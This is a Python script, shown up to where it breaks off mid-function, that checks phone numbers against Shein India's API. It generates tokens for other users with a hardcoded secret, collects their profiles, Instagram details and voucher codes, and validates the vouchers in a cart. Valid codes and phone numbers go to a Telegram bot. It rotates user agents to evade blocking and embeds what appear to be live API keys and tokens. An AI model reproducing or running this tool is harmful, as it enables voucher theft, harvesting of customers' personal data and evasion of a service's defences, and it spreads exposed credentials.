#!/usr/bin/env python3
"""
Shein Voucher Scanner - With Telegram Notifications (Optimized Speed)
With resume capability, coupon validation, and UA speed benchmarking
"""

import requests
import time
import sys
import os
import json
import threading
import platform as _platform
from http.server import HTTPServer, BaseHTTPRequestHandler
from colorama import init, Fore
from datetime import datetime, date as _date
from concurrent.futures import ThreadPoolExecutor, as_completed

init(autoreset=True)

# ── RAILWAY DETECTION ─────────────────────────────────────────────────────────
# Railway injects $RAILWAY_ENVIRONMENT. Use this to skip all interactive prompts
# and start a minimal HTTP health-check server so the deploy doesn't fail.
IS_RAILWAY = bool(os.environ.get("RAILWAY_ENVIRONMENT") or os.environ.get("RAILWAY_PROJECT_ID"))

class _HealthHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"OK")
    def log_message(self, *args):
        pass  # suppress access logs

def start_health_server():
    port = int(os.environ.get("PORT", 8080))
    server = HTTPServer(("0.0.0.0", port), _HealthHandler)
    threading.Thread(target=server.serve_forever, daemon=True).start()
    print(f"✅ Health check server on port {port}")


def railway_input(prompt: str, notifier, default: str = "", timeout: int = 180) -> str:
    """
    On Railway: sends the prompt to Telegram and waits for your reply (up to timeout seconds).
    Reply with your answer, or reply 'default' / press nothing → uses the default value.
    On PC: falls back to normal input() — Railway logic is never triggered.
    """
    if not IS_RAILWAY:
        return input(prompt)

    default_hint = f"  ↩️ Reply <b>default</b> to use: <code>{default}</code>" if default != "" else "  ⚠️ No default — a value is required."
    notifier.send_message(
        f"❓ <b>Input needed:</b>\n\n"
        f"{prompt}\n\n"
        f"{default_hint}\n\n"
        f"⏳ Waiting {timeout}s..."
    )

    # Flush any pending old updates first so we don't pick up stale messages
    try:
        resp = requests.get(
            f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/getUpdates",
            params={"offset": -1}, timeout=5
        )
        updates = resp.json().get("result", [])
        offset = updates[-1]["update_id"] + 1 if updates else 0
    except Exception:
        offset = 0

    deadline = time.time() + timeout
    while time.time() < deadline:
        try:
            resp = requests.get(
                f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/getUpdates",
                params={"offset": offset, "timeout": 5},
                timeout=10
            )
            updates = resp.json().get("result", [])
            for update in updates:
                offset = update["update_id"] + 1
                msg = update.get("message", {})
                text = msg.get("text", "").strip()
                chat_id = str(msg.get("chat", {}).get("id", ""))
                if not text or chat_id != TELEGRAM_CHAT_ID:
                    continue
                # "default" keyword or empty → use default value
                if text.lower() == "default":
                    notifier.send_message(f"✅ Using default: <code>{default}</code>")
                    return default
                notifier.send_message(f"✅ Got: <code>{text}</code>")
                return text
        except Exception:
            time.sleep(2)

    # Timed out — use default
    notifier.send_message(f"⏰ Timed out — using default: <code>{default}</code>")
    return default

# Constants
AD_ID = "342f47d0-910f-4a29-9bd7-cadb98a2eca9"
SECRET_KEY = "3LFcKwBTXcsMzO5LaUbNYoyMSpt7M3RP5dW9ifWffzg"

# Telegram Bot Configuration
TELEGRAM_TOKEN = "8634947522:AAFs9RJeA6jNmABVuYBTmHs8UxEU3SIf1SY"
TELEGRAM_CHAT_ID = "1276512925"


# Shein API Token
SHEIN_BEARER_TOKEN = "eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJjbGllbnQiLCJjbGllbnROYW1lIjoidHJ1c3RlZF9jbGllbnQiLCJyb2xlcyI6W3sibmFtZSI6IlJPTEVfVFJVU1RFRF9DTElFTlQifV0sInRlbmFudElkIjoiU0hFSU4iLCJleHAiOjE3NzQzNzM4MDMsImlhdCI6MTc3MTc4MTgwM30.Dj1UvifYKjaFLh5b6YcWJ3Ad7mP6ooTZOVVaCkw3dc6BbnoyDlB6sjRWKF1_USwhH5wr5QJpDO2PM8j_OpDqzGR01LbRseL9wzHENkvnQXhlNfnjiuQIRUxwZ4QGNSfsD6wGfcek-LuYeTSVDO4mFbSzsr6KLV-e4PzEnXALa2EczZVc5CZvNVzgxveIeUZDgT-bf5ifuN3oMGO7PrzoVRb_7AcvwNcKL-0mArKidkEUimipN_Ypkd472NayOwY8M3Z7yneetdUKhGM9-sXlxtbLAKDt8dzPvz1btFypScEuRmsoK2epdFSbKShnljgdwkKBhIQiNuQFkP8pSBqMDQ"

PROGRESS_FILE = "5progress.txt"
STATS_FILE = "scan_stats1.json"
VALID_COUPONS_FILE = "valid_coupons.txt"

# ── JSONBin.io config ──────────────────────────────────────────
# 1. Go to https://jsonbin.io → sign up free → "Create Bin"
# 2. Create a bin with initial content: {}
# 3. Copy the Bin ID from the URL (looks like: 6649a3f6acd3cb34a836e123)
# 4. Go to API Keys → create a key → paste below
JSONBIN_BIN_ID  = "69a4314aae596e708f54fc8b"
JSONBIN_API_KEY = "$2a$10$FXK9W3no6az/yshqkeK5hekEQEMwHwSvkVG75rsWJs/Ln8j/YYZ/O"
# ──────────────────────────────────────────────────────────────

WORKING_UAS = [
    "okhttp/4.9.0",
    "okhttp/3.12.1",
    "curl/7.68.0",
"Shein/5.9.4 (Android 7.1.2; SM-G930F)",
"Shein/5.9.6 (Android 9; SM-G960F)",
"Shein/5.9.6 (Android 10; SM-G973F)",
"Shein/5.9.4 (Android 9; SM-G960F)",
"Shein/5.9.9 (Android 7.0; SM-G930F)",
"Shein/5.9.5 (Android 4.4.4; SM-G900F)",
"Shein/5.9.5 (Android 4.4.2; SM-G900F)",
"Shein/5.9.4 (Android 13; SM-S908B)",
"Shein/5.9.4 (Android 7.0; SM-G930F)",
"Shein/5.9.6 (Android 7.1.1; SM-G930F)",
"Shein/5.9.6 (Android 8.1; SM-G950F)",
"Shein/5.9.4 (Android 8.0; SM-G950F)",
"Shein/5.9.3 (Android 14; SM-S918B)",
"Shein/5.9.4 (Android 12; SM-G998B)",
"Shein/5.9.6 (Android 15; SM-G991B)",
"Shein/5.9.3 (Android 9; SM-G960F)",
"Shein/5.9.4 (Android 10; SM-G973F)",
"Shein/5.9.5 (Android 4.4; SM-G900F)",
"Shein/5.9.9 (Android 5.1; SM-G900F)",
"Shein/5.9.3 (Android 5.0; SM-G900F)",
    "com.shein/7.0.0 (Linux; U; Android 13; en_us)",
    "com.shein/6.9.0 (Linux; U; Android 12; en_us)",
    "okhttp/3.12.6",
"python-requests/2.21.0",
"curl/7.84.0",
"okhttp/3.12.8",
"curl/7.82.0",
"okhttp/3.11.0",
"okhttp/3.12.4",
"okhttp/3.12.3",
"okhttp/3.10.0",
"okhttp/3.12.9"
]

UA_SWITCH_AFTER_FAILURES = 5

def get_platform_label():
    is_android = "ANDROID_ROOT" in os.environ or "com.termux" in os.environ.get("PREFIX", "")
    if is_android:
        return "Termux"
    # Allow override via INSTANCE_NAME env var or instance.txt file for multiple Windows instances
    custom_name = os.environ.get("INSTANCE_NAME", "").strip()
    if not custom_name:
        try:
            if os.path.exists("instance.txt"):
                with open("instance.txt", "r") as _f:
                    custom_name = _f.read().strip()
        except Exception:
            pass
    if custom_name:
        return custom_name
    return _platform.system()  # Windows, Linux, Darwin

PLATFORM = get_platform_label()
_TAG_MAP = {"Windows": "(ᵖᶜ)", "Termux": "(ᵗᵉʳ)"}
PLATFORM_TAG = _TAG_MAP.get(PLATFORM, f"({PLATFORM[:3].lower()})")


class JSONBinStore:
    """Handles reading/writing per-platform stats to a shared JSONBin.io bin.
    Structure: { "PC": {stats...}, "PC2": {stats...}, "Termux": {stats...} }
    Each instance only writes its own key — never overwrites other platforms.
    Falls back silently if JSONBin is unreachable."""

    BASE = "https://api.jsonbin.io/v3/b"

    def __init__(self, bin_id, api_key):
        self.bin_id  = bin_id
        self.api_key = api_key
        self._enabled = bool(bin_id and bin_id != "YOUR_BIN_ID_HERE"
                             and api_key and api_key != "YOUR_API_KEY_HERE")

    def _headers(self):
        return {
            "X-Master-Key": self.api_key,
            "Content-Type": "application/json",
        }

    def fetch_all(self):
        """Return the full bin dict {platform: stats_dict}, or {} on failure."""
        if not self._enabled:
            return {}
        try:
            r = requests.get(
                f"{self.BASE}/{self.bin_id}/latest",
                headers=self._headers(),
                timeout=8
            )
            if r.status_code == 200:
                return r.json().get("record", {})
        except Exception:
            pass
        return {}

    def fetch_platform(self, platform):
        """Return this platform's stats dict from the bin, or None on failure."""
        data = self.fetch_all()
        return data.get(platform)

    def push_platform(self, platform, stats_dict):
        """Merge this platform's stats into the bin without touching other platforms."""
        if not self._enabled:
            return False
        try:
            # Read current bin first
            current = self.fetch_all()
            current[platform] = stats_dict
            r = requests.put(
                f"{self.BASE}/{self.bin_id}",
                headers=self._headers(),
                json=current,
                timeout=10
            )
            return r.status_code == 200
        except Exception:
            return False

    def get_combined_totals(self):
        """Sum stats across all platforms. Returns (totals_dict, per_platform_dict)."""
        all_data = self.fetch_all()
        keys = ["total_scanned", "total_valid_vouchers", "total_vouchers_checked",
                "users_with_vouchers", "invalid_vouchers_count",
                "no_token_count", "no_account_count"]
        totals = {k: 0 for k in keys}
        for platform, pstats in all_data.items():
            if not isinstance(pstats, dict):
                continue
            for k in keys:
                totals[k] += pstats.get(k, 0)
        return totals, all_data


# Single shared instance used throughout
_jsonbin = JSONBinStore(JSONBIN_BIN_ID, JSONBIN_API_KEY)


def _restore_stats_from_telegram():
    """Restore full stats for this platform from bot description registry."""
    try:
        r = requests.get(f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/getMyDescription", timeout=5)
        desc = r.json().get("result", {}).get("description", "") or ""
        if not desc.startswith("{"):
            return None
        registry = json.loads(desc)
        entry = registry.get(PLATFORM)
        if not entry or not isinstance(entry, dict):
            return None
        restored = {
            "total_scanned":           entry.get("scanned", 0),
            "total_hits":              entry.get("hits", 0),
            "total_vouchers_checked":  entry.get("tested", 0),
            "total_valid_vouchers":    entry.get("valid", 0),
            "users_with_vouchers":     entry.get("users", 0),
            "no_token_count":          entry.get("no_token", 0),
            "no_account_count":        entry.get("no_acct", 0),
            "invalid_vouchers_count":  entry.get("redeemed", 0),
            "last_updated":            datetime.now().isoformat()
        }
        return restored
    except Exception:
        return None


class StatsManager:
    def __init__(self):
        self.stats = self.load_stats()

    def load_stats(self):
        default_stats = {
            "total_scanned": 0,
            "total_hits": 0,
            "total_vouchers_checked": 0,
            "total_valid_vouchers": 0,
            "users_with_vouchers": 0,
            "no_token_count": 0,
            "no_account_count": 0,
            "invalid_vouchers_count": 0,
            "last_updated": datetime.now().isoformat()
        }
        # Try Telegram first (most up to date)
        restored = _restore_stats_from_telegram()
        if restored:
            print(f"{Fore.GREEN}✅ Stats loaded from Telegram: "
                  f"{restored['total_scanned']:,} scanned, "
                  f"{restored['total_valid_vouchers']} valid")
            return restored
        # Fallback to JSONBin
        if _jsonbin._enabled:
            remote = _jsonbin.fetch_platform(PLATFORM)
            if remote and isinstance(remote, dict):
                local = default_stats.copy()
                for key in default_stats:
                    if key in remote and key != "last_updated":
                        local[key] = remote[key]
                print(f"{Fore.GREEN}✅ Stats loaded from JSONBin: "
                      f"{local['total_scanned']:,} scanned, "
                      f"{local['total_valid_vouchers']} valid")
                return local
        print(f"{Fore.YELLOW}⚠️  No saved stats found — starting fresh")
        return default_stats.copy()

    def save_stats(self):
        """Push to Telegram registry + JSONBin — no local file."""
        self.stats["last_updated"] = datetime.now().isoformat()
        # Telegram is updated by _register_ping every 15s, no need to call here
        # Just push to JSONBin in background
        self.push_to_remote()

    def reset_stats(self):
        """Reset all stats to zero — called by /dels command."""
        self.stats = {
            "total_scanned": 0,
            "total_hits": 0,
            "total_vouchers_checked": 0,
            "total_valid_vouchers": 0,
            "users_with_vouchers": 0,
            "no_token_count": 0,
            "no_account_count": 0,
            "invalid_vouchers_count": 0,
            "last_updated": datetime.now().isoformat()
        }
        self.save_stats()

    def push_to_remote(self):
        """Push stats to JSONBin in background — non-blocking."""
        if not _jsonbin._enabled:
            return
        payload = {k: v for k, v in self.stats.items()}
        def _push():
            ok = _jsonbin.push_platform(PLATFORM, payload)

        threading.Thread(target=_push, daemon=True).start()

    def update_scan_stats(self, has_voucher=False, valid_count=0, total_tested=0,
                          no_token=False, no_account=False, invalid_voucher=False):
        self.stats["total_scanned"] += 1
        if valid_count > 0:
            self.stats["total_valid_vouchers"] += valid_count
            self.stats["total_hits"] += valid_count
        if has_voucher:
            self.stats["users_with_vouchers"] += 1
            self.stats["total_vouchers_checked"] += total_tested
        if no_token:
            self.stats["no_token_count"] += 1
        elif no_account:
            self.stats["no_account_count"] += 1
        elif invalid_voucher:
            self.stats["invalid_vouchers_count"] += 1
        # Push to JSONBin every 50 scans or on every valid hit
        if self.stats["total_scanned"] % 50 == 0 or valid_count > 0:
            self.push_to_remote()

    def get_stats(self):
        return self.stats


class TelegramNotifier:
    __slots__ = ('token', 'chat_id', 'base_url')

    def __init__(self, token, chat_id):
        self.token = token
        self.chat_id = chat_id
        self.base_url = f"https://api.telegram.org/bot{token}"

    def send_message(self, message, parse_mode="HTML"):
        try:
            response = requests.post(
                f"{self.base_url}/sendMessage",
                json={"chat_id": self.chat_id, "text": message, "parse_mode": parse_mode},
                timeout=10
            )
            return response.status_code == 200
        except Exception:
            return False

    def send_voucher_alert(self, phone, user_data, voucher_code, invalid_codes=None):
        insta = user_data.get("instagram_data", {})
        insta_username = insta.get("username", "Not connected") if insta else "Not connected"
        followers = insta.get("followers_count", 0) if insta else 0
        part_line = f"💻 <b>Platform: {PLATFORM}</b>\n"
        divider = "━━━━━━━━━━━━━━━━━━━━━━"

        voucher_details = ""
        alert_amount = "?"
        for v in user_data.get("vouchers", []):
            if v.get('voucher_code') == voucher_code:
                amount = v.get('voucher_amount', 'Unknown')
                alert_amount = amount
                min_pur = v.get('min_purchase_amount', '')
                expiry = v.get('expiry_date', '')
                if expiry:
                    expiry = expiry.split('T')[0] if 'T' in expiry else expiry[:10]
                voucher_details = f"💰 <b>Amount:</b> ₹{amount}\n"
                if min_pur:
                    voucher_details += f"🛒 <b>Min Purchase:</b> ₹{min_pur}\n"
                if expiry:
                    voucher_details += f"📅 <b>Expires:</b> {expiry}\n"
                break

        invalid_lines = ""
        if invalid_codes:
            invalid_lines = "".join(f"⛔ <b>Redeemed:</b> <code>{c}</code>\n" for c in invalid_codes)

        message = (
            f"✅ <b>₹{alert_amount} ᴠᴏᴜᴄʜᴇʀ ғᴏᴜɴᴅ! {PLATFORM_TAG}</b>\n"
            f"{divider}\n"
            f"{part_line}"
            f"📱 <b>Phone:</b> <code>{phone}</code>\n"
            f"📸 <b>Insta:</b> @{insta_username}\n"
            f"👥 <b>Followers:</b> {followers}\n"
            f"🔑 <b>Voucher:</b> <code>{voucher_code}</code>\n"
            f"{voucher_details}"
            f"{invalid_lines}"
            f"{divider}\n"
        )
        return self.send_message(message)

    def send_block_alert(self):
        return self.send_message(f"🚫 <b>BLOCKED</b>\n\nMultiple 403 errors\nTime: {datetime.now().strftime('%H:%M:%S')}")


class UABenchmark:
    @staticmethod
    def test_ua_speed(ua, test_url="https://api.services.sheinindia.in/uaas/jwt/token/client", num_requests=3):
        session = requests.Session()

        headers = {
            "User-Agent": ua,
            "Accept": "application/json",
            "Client_type": "Android/32",
            "Client_version": "1.0.14",
            "X-Tenant-Id": "SHEIN",
            "Ad_id": AD_ID,
            "Connection": "keep-alive",
            "X-Tenant": "B2C",
            "Content-Type": "application/x-www-form-urlencoded",
        }
        times = []
        for _ in range(num_requests):
            try:
                start = time.perf_counter()
                response = session.post(
                    test_url,
                    headers=headers,
                    data="grantType=client_credentials&clientName=trusted_client&clientSecret=secret",
                    timeout=5
                )
                end = time.perf_counter()
                if response.status_code in [200, 403]:
                    times.append(end - start)
            except Exception:
                continue
        if times:
            return ua, sum(times) / len(times), len(times)
        return ua, float('inf'), 0

    @staticmethod
    def get_sorted_uas():
        total = len(WORKING_UAS)
        completed = [0]
        spinner_frames = ["⠋","⠙","⠹","⠸","⠼","⠴","⠦","⠧","⠇","⠏"]
        stop_spinner = [False]

        def _spinner():
            i = 0
            while not stop_spinner[0]:
                pct = int((completed[0] / total) * 20)
                bar = "█" * pct + "░" * (20 - pct)
                frame = spinner_frames[i % len(spinner_frames)]
                print(f"\r{Fore.CYAN}{frame} Benchmark Testing For UA  [{bar}] {completed[0]}/{total}", end="", flush=True)
                i += 1
                time.sleep(0.05)

        import threading as _threading
        spin_thread = _threading.Thread(target=_spinner, daemon=True)
        spin_thread.start()

        results = []
        with ThreadPoolExecutor(max_workers=5) as executor:
            future_to_ua = {executor.submit(UABenchmark.test_ua_speed, ua): ua for ua in WORKING_UAS}
            for future in as_completed(future_to_ua):
                ua, avg_time, success_count = future.result()
                results.append((ua, avg_time, success_count))
                completed[0] += 1

        stop_spinner[0] = True
        spin_thread.join()

        valid_results = [(ua, t) for ua, t, count in results if count > 0]
        if not valid_results:
            print(f"\r{Fore.RED}❌ All UAs failed! Using default order.{' '*30}")
            return WORKING_UAS.copy()

        valid_results.sort(key=lambda x: x[1])
        sorted_uas = [ua for ua, _ in valid_results]

        fastest = sorted_uas[0]
        print(f"\r{Fore.GREEN}✅ Benchmark done — Fastest UA: {fastest[:45]}...{' '*10}")

        print(f"\n{Fore.YELLOW}UA Speed Ranking:")
        for i, ua in enumerate(sorted_uas, 1):
            time_ms = next((t*1000 for u, t in valid_results if u == ua), 0)
            if i == 1:
                medal, color = "🥇", Fore.YELLOW
            elif i == 2:
                medal, color = "🥈", Fore.WHITE
            elif i == 3:
                medal, color = "🥉", Fore.RED
            else:
                medal, color = f"{i}.", Fore.RESET
            print(f"{color}{medal} {ua[:50]}... → {time_ms:.1f}ms")
        print()
        return sorted_uas


class SheinScanner:
    def __init__(self, notifier, stats_manager, cart_id, use_benchmarked_ua=True):
        self.session = requests.Session()
        adapter = requests.adapters.HTTPAdapter(pool_connections=4, pool_maxsize=8)
        self.session.mount("https://", adapter)
        self.session.mount("http://", adapter)

        self.notifier = notifier
        self.stats_manager = stats_manager
        self.cart_id = cart_id
        self.bearer_token = SHEIN_BEARER_TOKEN

        self.sorted_uas = UABenchmark.get_sorted_uas()
        self.ua_index = 0

        if use_benchmarked_ua:
            self.current_ua = self.sorted_uas[0]
            print(f"{Fore.GREEN}🚀 Using fastest UA: {self.current_ua[:50]}...")
        else:
            self.current_ua = WORKING_UAS[0]
            print(f"{Fore.YELLOW}⚠️ Using default UA (benchmark disabled)")

        self.error_count = 0
        self.block_threshold = 5
        self.consecutive_failures = 0
        self._token_fail_alerted = False  # alert once when all UAs fail
        self._net_fail_count = 0         # consecutive network errors across all API calls
        self._net_down_alerted = False   # alert only once per outage
        self._was_disconnected = False   # true while we are in a disconnect event
        self._last_disconnect_alert_ts = 0  # epoch of last disconnect alert (cooldown)
        self._disconnect_msg_id = None   # Telegram message_id to delete on reconnect


    def get_headers(self, endpoint_type="api", token=None):
        base_headers = {
            "User-Agent": self.current_ua,
            "Accept": "application/json",
            "Client_type": "Android/32",
            "Client_version": "1.0.14",
            "X-Tenant-Id": "SHEIN",
            "Ad_id": AD_ID,
            "Connection": "keep-alive",
        }
        if endpoint_type == "shein_token":
            base_headers.update({"X-Tenant": "B2C", "Content-Type": "application/x-www-form-urlencoded"})
        elif endpoint_type == "account_check":
            base_headers.update({"Authorization": f"Bearer {token}", "X-Tenant": "B2C", "Content-Type": "application/x-www-form-urlencoded"})
        elif endpoint_type == "creator_token":
            base_headers.update({"Content-Type": "application/json"})
        elif endpoint_type == "user_profile" and token:
            base_headers = {
                "Authorization": f"Bearer {token}",
                "User-Agent": self.current_ua,
                "Accept": "*/*",
                "Origin": "https://sheinverse.galleri5.com",
                "Referer": "https://sheinverse.galleri5.com/",
                "Connection": "keep-alive",
            }
        elif endpoint_type == "voucher_validation":
            base_headers.update({"Authorization": f"Bearer {self.bearer_token}", "Content-Type": "application/x-www-form-urlencoded"})
        return base_headers

    def switch_user_agent(self):
        if len(self.sorted_uas) <= 1:
            return False
        self.ua_index = (self.ua_index + 1) % len(self.sorted_uas)
        self.current_ua = self.sorted_uas[self.ua_index]
        position = self.ua_index + 1
        print(f"\r{Fore.YELLOW}🔄 Switching to #{position} fastest UA ({position}/{len(self.sorted_uas)})" + " " * 20, end="", flush=True)
        return True


    def _is_internet_down(self):
        """Quick check — try a fast DNS-level ping. Returns True if offline."""
        try:
            requests.get("https://1.1.1.1", timeout=3)
            return False
        except Exception:
            try:
                requests.get("https://api.services.sheinindia.in", timeout=4)
                return False
            except Exception:
                return True

    def _wait_for_internet(self):
        """Block until internet is back, delete disconnect alert, send reconnect alert."""
        print(f"\r{Fore.RED}📡 No internet — pausing scan...{' ' * 30}", flush=True)
        while True:
            time.sleep(5)
            if not self._is_internet_down():
                break
            print(f"\r{Fore.RED}📡 Still offline... waiting{' ' * 30}", end="", flush=True)
        # Internet is back — wait up to 15s for _send_disconnect thread to finish storing message_id
        print(f"\r{Fore.GREEN}✅ Internet reconnected — resuming...{' ' * 20}", flush=True)
        for _ in range(30):
            if self._disconnect_msg_id:
                break
            time.sleep(0.5)
        # Delete the disconnect message
        try:
            if self._disconnect_msg_id:
                requests.post(
                    f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/deleteMessage",
                    json={"chat_id": TELEGRAM_CHAT_ID, "message_id": self._disconnect_msg_id},
                    timeout=5
                )
                self._disconnect_msg_id = None
        except Exception:
            pass
        # Send reconnect alert
        try:
            self.notifier.send_message(f"📡 <b>Internet Reconnected</b> — {PLATFORM} ✅")
        except Exception:
            pass
        # Reset network state only after everything is done
        self._net_fail_count = 0
        self._net_down_alerted = False
        self._was_disconnected = False

    def _on_network_error(self):
        """Call on every ConnectionError/Timeout — alerts if internet looks down."""
        self._net_fail_count += 1
        cooldown_ok = (time.time() - self._last_disconnect_alert_ts) > 60
        if self._net_fail_count >= 5 and not self._net_down_alerted and cooldown_ok:
            self._net_down_alerted = True
            self._was_disconnected = True
            self._last_disconnect_alert_ts = time.time()
            print(f"\n{Fore.RED}📡 Internet may be down!{' ' * 20}", flush=True)
            # Send disconnect alert in background, store message_id for later deletion
            def _send_disconnect():
                while True:
                    try:
                        resp = requests.post(
                            f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage",
                            json={"chat_id": TELEGRAM_CHAT_ID,
                                  "text": f"📡 <b>Internet Disconnected</b> — {PLATFORM}",
                                  "parse_mode": "HTML"},
                            timeout=10
                        )
                        if resp.status_code == 200:
                            self._disconnect_msg_id = resp.json().get("result", {}).get("message_id")
                            break
                    except Exception:
                        time.sleep(1)
            threading.Thread(target=_send_disconnect, daemon=True).start()

    def _on_network_ok(self):
        """Call on every successful response — resets failure count."""
        self._net_fail_count = 0
        # Only clear alerted flag if not in an active disconnect event
        if not self._was_disconnected:
            self._net_down_alerted = False

    def get_shein_token_with_retry(self):
        attempts = 0
        max_attempts = len(self.sorted_uas) * 2
        while attempts < max_attempts:
            try:
                r = self.session.post(
                    "https://api.services.sheinindia.in/uaas/jwt/token/client",
                    headers=self.get_headers("shein_token"),
                    data="grantType=client_credentials&clientName=trusted_client&clientSecret=secret",
                    timeout=5
                )
                if r.status_code == 200:
                    self.error_count = 0
                    self._on_network_ok()
                    return r.json().get("access_token")
                elif r.status_code == 403:
                    self.error_count += 1
                    if self.error_count >= self.block_threshold:
                        self.notifier.send_block_alert()
                        self.error_count = 0
                        time.sleep(5)
                    print(f"\r{Fore.RED}⚠️ Token blocked (403) — switching UA" + " " * 20, end="", flush=True)
                    self.switch_user_agent()
                    attempts += 1
                    time.sleep(0.5)
                else:
                    print(f"\r{Fore.RED}⚠️ Token failed ({r.status_code}) — switching UA" + " " * 20, end="", flush=True)
                    self.switch_user_agent()
                    attempts += 1
                    time.sleep(0.3)
            except requests.exceptions.ConnectionError:
                self._on_network_error()
                if self._is_internet_down():
                    self._wait_for_internet()
                    attempts = 0
                    self.error_count = 0
                else:
                    print(f"\r{Fore.RED}⚠️ Connection error — switching UA" + " " * 20, end="", flush=True)
                    self.switch_user_agent()
                    attempts += 1
                    time.sleep(0.5)
            except requests.exceptions.Timeout:
                self._on_network_error()
                if self._is_internet_down():
                    self._wait_for_internet()
                    attempts = 0
                    self.error_count = 0
                else:
                    print(f"\r{Fore.RED}⚠️ Timeout — switching UA" + " " * 20, end="", flush=True)
                    self.switch_user_agent()
                    attempts += 1
                    time.sleep(0.3)
            except requests.exceptions.RequestException:
                self._on_network_error()
                print(f"\r{Fore.RED}⚠️ Token request error — switching UA" + " " * 20, end="", flush=True)
                self.switch_user_agent()
                attempts += 1
                time.sleep(0.5)
        return None

    def check_account(self, token, phone):
        try:
            r = self.session.post(
                "https://api.services.sheinindia.in/uaas/accountCheck?client_type=Android%2F32&client_version=1.0.14",
                headers=self.get_headers("account_check", token),
                data=f"mobileNumber={phone}",
                timeout=4
            )
            if r.status_code == 403:
                print(f"\r{Fore.RED}⚠️ Account check blocked (403) — switching UA" + " " * 20, end="", flush=True)
                self.switch_user_agent()
            if r.status_code == 200:
                self._on_network_ok()
            return r.json() if r.status_code == 200 else None
        except requests.exceptions.ConnectionError:
            self._on_network_error()
            return None
        except requests.exceptions.Timeout:
            self._on_network_error()
            return None
        except Exception:
            return None

    def get_creator_token(self, phone, encrypted_id):
        try:
            r = self.session.post(
                "https://g5creator.xg5.in/api/v1/auth/generate-token",
                headers=self.get_headers("creator_token"),
                json={
                    "client_type": "Android/32",
                    "client_version": "1.0.14",
                    "phone_number": phone,
                    "secret_key": SECRET_KEY,
                    "user_id": encrypted_id
                },
                timeout=4
            )
            if r.status_code == 403:
                print(f"\r{Fore.RED}⚠️ Creator token blocked (403) — switching UA" + " " * 20, end="", flush=True)
                self.switch_user_agent()
            if r.status_code == 200:
                self._on_network_ok()
            return r.json().get("access_token") if r.status_code == 200 else None
        except requests.exceptions.ConnectionError:
            self._on_network_error()
            return None
        except requests.exceptions.Timeout:
            self._on_network_error()
            return None
        except Exception:
            return None

    def get_user_profile(self, token):
        try:
            r = self.session.get(
                "https://g5creator.xg5.in/api/v1/user",
                headers=self.get_headers("user_profile", token),
                timeout=4
            )
            if r.status_code == 403:
                print(f"\r{Fore.RED}⚠️ User profile blocked (403) — switching UA" + " " * 20, end="", flush=True)
                self.switch_user_agent()
            if r.status_code == 200:
                self._on_network_ok()
            return r.json() if r.status_code == 200 else None
        except requests.exceptions.ConnectionError:
            self._on_network_error()
            return None
        except requests.exceptions.Timeout:
            self._on_network_error()
            return None
        except Exception:
            return None

    def add_voucher_to_cart(self, voucher_code):
        try:
            url = f"https://api.services.sheinindia.in/rilfnlwebservices/v2/rilfnl/users/anonymous/carts/{self.cart_id}/vouchers"
            r = self.session.post(
                f"{url}?client_type=Android%2F32&client_version=1.0.14",
                headers=self.get_headers("voucher_validation"),
                data=f"voucherId={voucher_code}&employeeOfferRestriction=true",
                timeout=5
            )
            if r.status_code == 200:
                return True, r.status_code, r.text
            elif r.status_code == 400:
                try:
                    error_json = r.json()
                    error_str = str(error_json)
                    if "Cart not found" in error_str:
                        print(f"{Fore.RED}\n🚫 CART ID NOT FOUND! Stopping scanner...")
                        self.notifier.send_message(
                            f"🚫 <b>CART ID INVALID!</b>\n\n"
                            f"🛒 <b>Cart ID:</b> <code>{self.cart_id}</code>\n"
                            f"❌ Cart not found — scanner stopped.\n"
                            f"Please restart with a valid Cart ID."
                        )
                        sys.exit(1)
                    if "Invalid coupon" in error_str:
                        return False, r.status_code, "Invalid coupon"
                except SystemExit:
                    raise
                except Exception:
                    pass
                return False, r.status_code, r.text
            elif r.status_code == 403:
                print(f"\r{Fore.RED}🚫 Voucher check blocked (403) — switching UA" + " " * 20, end="", flush=True)
                self.switch_user_agent()
                return False, r.status_code, "Blocked"
            else:
                return False, r.status_code, r.text
        except Exception as e:
            return False, 0, str(e)

    def remove_voucher_from_cart(self, voucher_code):
        try:
            url = f"https://api.services.sheinindia.in/rilfnlwebservices/v2/rilfnl/users/anonymous/carts/{self.cart_id}/vouchers/{voucher_code}"
            r = self.session.post(
                f"{url}?client_type=Android%2F32&client_version=1.0.14",
                headers=self.get_headers("voucher_validation"),
                timeout=5
            )
            if r.status_code == 200:
                return True
            elif r.status_code == 403:
                self.switch_user_agent()
                return False
            else:
                print(f"{Fore.YELLOW}⚠️ Could not remove voucher (status: {r.status_code})")
                return False
        except Exception as e:
            return False

    def save_valid_voucher(self, phone, voucher_code, user_data=None):
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        # Save to main log file
        with open(VALID_COUPONS_FILE, "a", encoding="utf-8") as f:
            f.write(f"{timestamp} | {phone} | {voucher_code}\n")
        # Save voucher code only to amount-based file
        amount = None
        if user_data:
            for v in user_data.get("vouchers", []):
                if v.get("voucher_code") == voucher_code:
                    amount = v.get("voucher_amount")
                    break
            if amount is None:
                v_data = user_data.get("voucher_data", {})
                if v_data and v_data.get("voucher_code") == voucher_code:
                    amount = v_data.get("voucher_amount")
        filename = f"{int(amount)}_coupon.txt" if amount else "500_coupon.txt"
        with open(filename, "a", encoding="utf-8") as f:
            f.write(f"{voucher_code}\n")

    def extract_vouchers(self, user_data):
        if not user_data:
            return []
        vouchers = []
        seen_codes = set()
        v_data = user_data.get("voucher_data")
        if v_data and isinstance(v_data, dict):
            code = v_data.get('voucher_code')
            if code and code not in seen_codes:
                vouchers.append(v_data)
                seen_codes.add(code)
        for v in user_data.get("vouchers", []):
            if isinstance(v, dict):
                code = v.get('voucher_code')
                if code and code not in seen_codes:
                    vouchers.append(v)
                    seen_codes.add(code)
        return vouchers

    def _try_once(self, phone, current_index, total_numbers):
        token = self.get_shein_token_with_retry()
        if not token:
            return None, None

        account = self.check_account(token, phone)
        if not account:
            return None, None

        if not account.get("success"):
            self.stats_manager.update_scan_stats(no_account=True)
            print(f"\r{Fore.MAGENTA}[{current_index}/{total_numbers}] {phone} - No Account | Hits: {self.stats_manager.stats['total_valid_vouchers']}", end="")
            return 0, None

        encrypted_id = account.get("encryptedId")
        if not encrypted_id:
